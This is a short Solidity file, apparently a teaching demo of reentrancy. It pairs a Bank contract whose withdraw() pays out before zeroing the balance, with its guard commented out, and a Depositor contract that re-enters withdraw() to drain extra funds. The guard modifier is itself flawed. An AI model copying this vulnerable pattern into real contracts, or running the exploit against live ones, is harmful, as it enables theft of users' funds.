// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

contract Bank {
    mapping(address => uint) balances;

    bool reentrant = true;
    modifier reentrancyGuard() {
        require(reentrant);
        reentrant = false;
        _;
    }

    function deposit() external payable {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
    }

    function withdraw() external /*reentrancyGuard*/
    {
        require(balances[msg.sender] > 0);
        // Checks effectrs interactions fixes this
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success);
        balances[msg.sender] = 0;
    }
}

contract Depositor {
    bool exploit = true;

    receive() external payable {
        if (exploit) {
            exploit = false;
            Bank(msg.sender).withdraw();
        }
    }

    function reentrancy(address bankAddress) external payable {
        Bank(bankAddress).deposit{value: msg.value}();
        Bank(bankAddress).withdraw();
    }
}
